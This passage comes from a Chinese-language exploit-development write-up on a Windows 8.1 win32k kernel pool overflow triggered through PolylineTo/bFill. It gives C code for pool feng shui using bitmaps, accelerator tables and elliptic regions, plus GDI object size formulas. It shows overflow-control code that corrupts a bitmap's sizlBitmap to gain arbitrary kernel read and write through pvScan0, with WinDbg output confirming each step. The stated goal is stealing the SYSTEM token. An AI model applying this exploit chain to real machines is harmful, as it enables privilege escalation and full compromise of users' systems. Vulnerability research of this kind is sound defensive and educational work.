
```
bufaddr = fffff90141c464b0
第一次 rax=fffff90141c464e0
第二次 rax=fffff90141c46510
第三次 rax=fffff90141c46540
第四次 rax=fffff90141c46540
第五次 rax=fffff90141c46540
```

好的，现在到了`buf+0x90`的位置以后，继续执行，地址并没有增加，这说明我们之前的分析是正确的，决定`buf`地址是否增加的因素只有：

- `points[i+1].y < 0 || points[i].y > 0x1F` 成立则地址不增加
- `points[i+1].y >= 0 && points[i].y < 0x1F` 成立则地址增加`0x30`

## 第三步

现在我们已经可以控制要写到哪个地址，大小应为`0x55555557 * 0x30`，接下来需要确定我们要写入的地址，之前说过要写入`0xFFFFFFFF`，这是因为需要利用 GDI 对象来实现内核的任意读写。

但是想要利用 GDI 对象，不得不使用内核内存布局的技术，与 GDI 对象利用的方法，这正是我们接下来要讨论的。

# 利用 GDI 对象

这里要使用 `bitmap` 对象来实现内核的任意读写，它在内核中的结构如下所示：

```c
typedef struct {
    ULONG64 dhsurf;         // 0x00
    ULONG64 hsurf;          // 0x08
    ULONG64 dhpdev;         // 0x10
    ULONG64 hdev;           // 0x18
    SIZEL sizlBitmap;       // 0x20
    ULONG64 cjBits;         // 0x28
    ULONG64 pvBits;         // 0x30
    ULONG64 pvScan0;        // 0x38
    ULONG32 lDelta;         // 0x40
    ULONG32 iUniq;          // 0x44
    ULONG32 iBitmapFormat;  // 0x48
    USHORT iType;           // 0x4C
    USHORT fjBitmap;        // 0x4E
} SURFOBJ64; // sizeof = 0x50
```

要利用的成员为 `sizlBitmap` 与 `pvScan0`，`sizlBitmap` 是位图的宽度和高度，`pvScan0` 是指向位图数据开头的指针。

可以通过溢出到 `sizlBitmap` 来扩展位图可操作的内存大小，来修改下一个位图对象的 `pvScan0` 指针，这样就可以进行任意内存读写了。

此处更适合用图片来表达，引用一下图片：

![](upload/attach/202206/930159\_PB25PR5CX2DY62F.png)

![](upload/attach/202206/930159\_KKXQKRFGYS5C552.png)

简单解释一下，我们可以通过合理的内核内存布局来溢出写入到 `bitmapA` 的 `sizlBitmap` 成员，这样 `bitmapA` 就可以操作 `bitmapB` 的 `pvScan0` 指针，然后再通过 `bitmapB` 的 `pvScan0` 指针来实现任意内存读写。

也就是 `bitmapA` 作为管理者的位图，`bitmapB` 作为工作者的位图，管理位图负责控制工作位图的 `pvScan0` 指针，工作位图负责依靠 `pvScan0` 指针读写任意内存。

# 内核内存布局

外国人把这个技术叫做“内核池风水”，刚看的时候很奇怪，风水不是中国文化吗？

**这个技术要解决两个问题：**

- 在溢出写后，不触发 `pool header` 检查，只需要将 `buf` 布置到页面末尾即可，它只检查本页的 `pool header`。
- 合理布局 GDI 对象的位置，以达到后续目的。

**这个技术需要注意的问题：**

- 内核池页面大小为 `0x1000` 字节，任何更大的分配都将分配给大的内核池。
- 任何大于 `0x808` 的分配都将分配到内存页面的开头。
- 后续分配将从页面末尾开始分配。
- 分配需要是相同的池类型，在本例中是分页会话池。
- 分配对象通常会添加大小为 `0x10` 的池标头。如果分配的对象是 `0x50`，实际上会分配 `0x60` 大小的内存。

**整理一下利用思路：**

1. 通过申请与释放 GDI 对象，使内核分页池的布局在我们的控制中。
2. 计算分配位置，使溢出的时候，刚好用 `0xFFFFFFFF` 覆盖 `sizlBitmap` 成员。
3. 通过三环函数，获取到被溢出修改的对象，使它成为管理对象。
4. 使用管理对象，修改相邻的 `bitmap` 对象的 `pvScan0` 指针，使它成为工作对象。
5. 通过管理对象与工作对象的搭配，达到任意读写内核内存的目的。
6. 恢复被溢出的 `pool header` 等重要数据，防止蓝屏。
7. 窃取系统进程 Token（窃取是指此方法可绕过所有内核安全机制）。

**布局概览：**

引用一个动图来说明：

![](upload/attach/202206/930159\_29TPVBTZGC3ZRYR.gif)

## GDI 对象大小计算分析

### bitmap 对象

好吧，不得不解决一个问题，GDI 对象的大小问题，浅浅分析一下吧。

分析过程不提了，最后得到的 `bitmap` 在 win8.1 上面的大小计算公式为：

`size = (((Width+3) & 0xFFFFFFFC) * Height) + 0x258`，经过第一步计算，得到的值必定为 4 的倍数。

`size = size % 16 ? size + (0x10 - (size % 16)) : size`，第二次计算在申请内存的函数，如果地址不是 16 字节对齐的，会让它对齐（这部分在内核中实现，我推测的）。

最后再加 `pool header` 的 `0x10` 大小。

分析是在 `CreateBitmap(x, y, 1, 8, NULL)`，`x` `y` 为变量，后三个参数固定的情况下分析，如果改变，会影响 `switch-case` 的选择，当然大小计算方式就会改变。

`bitmap` 对象的最小值肯定不会低于 `0x258 + 0x10`。

### AcceleratorTable

加速表对象，这是一个用户对象，大小分配计算公式为：

`size = cAccel * 3 * 2 + 0x22`，分析得出。

`size = size % 16 ? size + (0x10 - (size % 16)) : size`，推测得出，前面也是这样，可能内核确实是这样设计的。

最后再加 `pool header` 的 `0x10` 大小。

最小值，肯定不会低于 `0x22 + 0x10`。

### EllipticRgn

还需要用到一个与 `bitmap` 无关的区域对象（同时它可以用来泄露内核地址，但是也无所谓，泄露内核地址的方法多的是）。懒得分析了，测试以后发现，第一个参数与第二个参数为 `0x79` 即可申请到 `0xBC0` 的大小。

## 内核池风水代码

有了准确的大小计算公式，风水反而成了最简单的部分：

```c
void fengshui()
{
    // 申请两千个大小为 0xFA0 的 bitmap 对象
    for (int i = 0; i < 2000; i++)
    {
        bitmaps[i] = CreateBitmap(0xD18, 1, 1, 8, NULL);
    }
    // 填补剩下的 0x80 的空洞
    ACCEL accel[12] = { 0 };
    for (int i = 0; i < 2000; i++)
    {
        hAccel[i] = CreateAcceleratorTableA(accel, 12);
    }
    // 释放 0xF80 的空间
    for (int i = 0; i < 2000; i++) {
        DeleteObject(bitmaps[i]);
    }
    // 用一个较大的对象来占坑 0xBC0 的空间
    for (int i = 0; i < 2000; i++) {
        CreateEllipticRgn(0x79, 0x79, 1, 1); // size = 0xbc0
    }
    // 重新用 bitmap 对象占坑 0x3C0 的空间
    for (int i = 0; i < 2000; i++)
    {
        bitmaps[i] = CreateBitmap(0x158, 1, 1, 8, NULL);
    }
    // 抢占一些 0x60 大小的空间
    ACCEL accel2[7] = { 0 };
    for (int i = 0; i < 1000; i++)
    {
        hAccel2[i] = CreateAcceleratorTableA(accel2, 7);
    }
    // 释放一些 0x80 大小的 ACCEL 对象留下空洞
    for (int i = 1000; i < 1500; i++) {
        DestroyAcceleratorTable(hAccel[i]);
    }
}
```

## 测试结果

在 `bFill` 中申请内存的地方下断，查看返回值：

```
kd> r rax
rax=fffff90142855fb0
kd> !pool rax
Pool page fffff90142855fb0 region is Paged session pool
fffff90142855000 size: bc0 previous size: 0 (Allocated) Gh14
fffff90142855bc0 size: 3c0 previous size: bc0 (Allocated) Gh15
fffff90142855f80 size: 20 previous size: 3c0 (Free) Free
*fffff90142855fa0 size: 60 previous size: 20 (Allocated) *Gedg
Pooltag Gedg : GDITAG_EDGE, Binary : win32k!bFill
kd> !pool rax+1000
Pool page fffff90142856fb0 region is Paged session pool
fffff90142856000 size: bc0 previous size: 0 (Allocated) Gh14
fffff90142856bc0 size: 3c0 previous size: bc0 (Allocated) Gh15
fffff90142856f80 size: 20 previous size: 3c0 (Free) Free
*fffff90142856fa0 size: 60 previous size: 20 (Free) *Usha
kd> !pool rax+2000
Pool page fffff90142857fb0 region is Paged session pool
fffff90142857000 size: bc0 previous size: 0 (Allocated) Gh14
fffff90142857bc0 size: 3c0 previous size: bc0 (Allocated) Gh15
*fffff90142857f80 size: 80 previous size: 3c0 (Free) *Usac
```

好的好的，现在已经避免了 `bFill` 中的释放内存蓝屏，并且我们的溢出利用布局也已经成功。

接下来研究一下如何控制溢出，使它正好覆盖到关键数据。

# 溢出写的控制

首先了解一下 `bitmap` 对象的布局：

```c
typedef struct {
    ULONG64 hHmgr;
    ULONG32 ulShareCount;
    WORD cExclusiveLock;
    WORD BaseFlags;
    ULONG64 Tid;
} BASEOBJECT64; // sizeof = 0x18

typedef struct {
    BASEOBJECT64 BaseObject; // 0x00
    SURFOBJ64 SurfObj;       // 0x18
    [...]
} SURFACE64;

typedef struct {
    ULONG64 dhsurf;         // 0x00
    ULONG64 hsurf;          // 0x08
    ULONG64 dhpdev;         // 0x10
    ULONG64 hdev;           // 0x18
    SIZEL sizlBitmap;       // 0x20
    ULONG64 cjBits;         // 0x28
    ULONG64 pvBits;         // 0x30
    ULONG64 pvScan0;        // 0x38
    ULONG32 lDelta;         // 0x40
    ULONG32 iUniq;          // 0x44
    ULONG32 iBitmapFormat;  // 0x48
    USHORT iType;           // 0x4C
    USHORT fjBitmap;        // 0x4E
} SURFOBJ64; // sizeof = 0x50
```

简单说一下对这个玩意的分析，在 `+0x258` 之前的大小，是位图数据所占的大小，`+0x258` 之后，首先是 `0x18` 字节的 `BaseObject`，然后是 `0x50` 字节的 `SURFOBJ64`，然后是 `0x258 - 0x68` 大小的一些不知道什么数据。

观察 `pvScan0` 指针可知，它所指向的位置是在 `BaseObject` 为起点，偏移 `0x258` 的位置，正好是位图数据，好的，一切那么合适。

所以最终的覆盖 `sizlBitmap` 的距离为 `0x50 + 0xBC0 + 0x10 + 0x18 + 0x20 = 0xC58`。

`sizlBitmap` 是两个 DWORD 值，所以最后覆盖这 8 字节范围都是可以的。

然后根据我们能溢出写 `0xFFFFFFFF` 的偏移，来计算应该移动 `buf` 指针多少次：

- `buf+0x14 = 0xFFFFFFFF`
- `buf+0x24 = 0xFFFFFFFF`
- `buf+0x28 = 0xFFFFFFFF`

还记着之前分析过，总共有三个地方，看哪个地方比较合适。

简单计算一下，得到 `0x41 * 0x30 = 0xC30`，刚好有 `buf+0x28 = 0xFFFFFFFF`，好的，就按这个来构造。

前面分析过，第一次必定会移动指针，所以，我们还需要构造 `0x40` 次移动，然后根据分析出来的条件设置数据。

## 再次分析程序流程

好吧，有点乱了，重新整理一下条件：

**让 `buf` 指针不移动的构造：**

1. `points[i+1].y >= points[i].y`
2. `points[i].y >= 0x1F`

**让 `buf` 指针移动 `0x30` 的正常构造：**

1. `points[i+1].y >= points[i].y`
2. `points[i+1].y >= 0`
3. `points[i].y <= 0x1F`
4. `points[i].y >= 0`
5. `points[i+1].y >= 0x1F`

**`0xFFFFFFFF` 的写入且 `buf` 指针不移动：**

1. `points[i+1].y < points[i].y`
2. `points[i+1].y >= 0x1F`

## 代码如下

```c
for (int i = 0; i < 0x3FE00; i++) {
    points[i].x = 0x6020;
    points[i].y = 0x6020;
}
points[2].y = 0x14;
points[0x3FE00].y = 0x5020;

for (int i = 0; i < 0x156; i++)
{
    if (i == 0x40)
    {
        points[2].y = 0x6020;
    }
    PolylineTo(hMemDC, points, 0x3FE01);
}
```

你会发现这样刚好满足所有条件，但是结果并不是我们期望中的，虽然成功修改了 `sizlBitmap`，但是很明显，后面还是继续移动 `buf` 指针了，这是为什么呢？

```
kd> dq fffff901716bbfb0+0xC30
fffff901`716bcbe0 fffff901`716bcbb0 00006020`0000000c
fffff901`716bcbf0 ffffffff`00000014 00600c00`00000000
fffff901`716bcc00 00000001`00000000 00000001`ffffffff
fffff901`716bcc10 fffff901`716bcbe0 00006020`0000000c
fffff901`716bcc20 ffffffff`00000014 00600c00`00000000
fffff901`716bcc30 00000001`00000000 00000000`00000001
fffff901`716bcc40 fffff901`716bcc10 00006020`0000000c
fffff901`716bcc50 ffffffff`00000014 00600c00`00000000
```

我们之前把 `points[2].y` 当成了 `points[i].y` 来构造，但是 `points[2].y` 作为 `points[i+1].y` 的时候会是什么情况？

**`points[i+1].y = 0x14` 造成的判断逻辑：**

1. `points[i+1].y < points[i].y`
2. `points[i+1].y >= 0`
3. `points[i+1].y < 0x1F`

有了这三个条件，成功进入了 `buf` 指针移动 `0x30` 的流程，只不过是设置 `buf + 0x28 = 0xFFFFFFFF` 的分支。

那接下来修改一下我们的条件，少一半就可以了呗：

```c
if (i == 0x20)
{
    points[2].y = 0x6020;
}
```

对比一下修改前后的数据：

```
kd> dq fffff901715c8bc0+10
fffff901`715c8bd0 00000000`010515dd 00000000`00000000
fffff901`715c8be0 00000000`00000000 00000000`00000000
fffff901`715c8bf0 00000000`010515dd 00000000`00000000
fffff901`715c8c00 00000000`00000000 00000001`00000158
fffff901`715c8c10 00000000`00000158 fffff901`715c8e28
fffff901`715c8c20 fffff901`715c8e28 00001e2d`00000158
fffff901`715c8c30 00010000`00000003 00000000`00000000
fffff901`715c8c40 00000000`04800200 00000000`00000000
```
